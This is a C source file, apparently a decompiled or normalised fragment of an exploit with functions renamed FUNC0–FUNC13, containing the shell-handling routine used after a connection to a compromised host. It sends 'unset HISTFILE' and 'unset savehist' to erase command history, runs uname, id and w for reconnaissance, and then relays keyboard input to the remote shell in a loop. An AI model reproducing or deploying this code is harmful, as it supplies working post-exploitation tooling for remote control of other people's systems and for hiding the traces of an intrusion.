#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  char u_char ;
typedef  int /*<<< orphan*/  fd_set ;
typedef  int /*<<< orphan*/  data ;

/* Variables and functions */
 scalar_t__ FUNC0 (int,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC1 (int,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC3 (int) ; 
 int /*<<< orphan*/  FUNC4 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC5 (int /*<<< orphan*/ ,char*,...) ; 
 int /*<<< orphan*/  FUNC6 (char*,int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  FUNC7 (char*) ; 
 int /*<<< orphan*/  FUNC8 (int /*<<< orphan*/ ,char*,int) ; 
 int FUNC9 (int,char*,int,int /*<<< orphan*/ ) ; 
 int FUNC10 (int,int /*<<< orphan*/ *,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  stdout ; 
 int FUNC11 (char*) ; 
 int /*<<< orphan*/  FUNC12 (int,char*,int) ; 

void FUNC13(int netfd)
{
   
    if (netfd == -1) {
        FUNC5(stderr, "ERROR: failed to connect\n");
        FUNC3(1);
    }

    FUNC4(stdout);
   
    FUNC5(stderr,"\n[ CONNECTED ! ]\n\n");
    {
        u_char data[8192] = {0};
        fd_set fdz;
    
        /* we'll take care of default stuff.. */
        FUNC12(netfd,"unset HISTFILE\n",15);
        FUNC12(netfd,"unset savehist\n",15);
        FUNC12(netfd,"export TERM=xterm\n",18);
        FUNC12(netfd,"export SHELL=sh\n",16);
        FUNC12(netfd,"uname -a\n",9);
        FUNC12(netfd,"id\n",3);
        FUNC12(netfd,"w\n",2);
     
        for(;;) {
            FUNC2(&fdz);
            FUNC1(0,&fdz);
            FUNC1(netfd,&fdz);

            if(FUNC10(255,&fdz,0,0,0)==-1){
                FUNC7("select");
                FUNC3(-1);
            }

            FUNC6(data,0,sizeof(data));

            if(FUNC0(netfd,&fdz)){
                if(FUNC9(netfd,data,sizeof(data)-1,0)==-1) {
                    FUNC5(stderr, "[x] ewps! connection closed by foreign host.\n");
                    return;
                }
                FUNC5(stderr,"%s",data);
            }
            if(FUNC0(0,&fdz)){
                FUNC8(0, data, sizeof(data) - 1);
                FUNC12(netfd,data,FUNC11(data));
            }
        }
    }
}